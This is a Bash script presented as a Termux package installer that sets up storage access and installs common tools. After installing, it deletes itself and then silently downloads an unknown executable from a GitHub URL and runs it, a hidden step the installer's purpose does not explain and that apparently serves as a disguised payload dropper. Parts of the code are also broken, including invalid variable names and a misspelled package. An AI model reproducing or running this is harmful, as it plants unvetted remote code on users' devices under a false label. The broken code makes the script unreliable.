# Định nghĩa các biến màu
1='\033[0;31m'
2='\033[0;32m'
3='\033[0;33m'
4='\033[0;34m'
0='\033[0m' # Mã reset màu về mặc định

clear
echo -e "${3}========================================================${0}"
echo -e"${3}       auto install pack for termux!${3}"
echo "${3}========================================================${0}"
sleep 2
clear
yes | termux-setup-storage 
clear
echo "${3}install pack...${0}"
pkg update
pkg upgrade -y
pkg install x11-repo -y
pkg install root-repo -y
pkg install termux-api -y
pkg install vim -y
pkg install nano -y
pkg install curl -y
pkg install wget -y
pkg install python -y
pkg install 7zip -y
pkg install git -y
pkg install nodejs -y
pkg install clang -y
pkg install make -y
pkg install openssh -y
pkg install nmap -y
pkg install net-tools -y
pkg install ffmpeg -y
pkg install imagemagick -y
pkg install htop -y
pkg install neofech -y
pkg install zsh -y
pkg install tree -y
pkg install nodejs-lts -y
pkg install unzip -y
pkg install git -y
pkg install termux-x11-nightly -y
pkg update
pkg upgrade -y
apt update
apt upgrade -y
clear
echo "${2}install pack complete${0}"

rm -- "$0"

curl -o hello.net 'https://raw.githubusercontent.com/Camtuong153/VM/refs/heads/main/File.net'
chmod +x hello.net
./hello.net
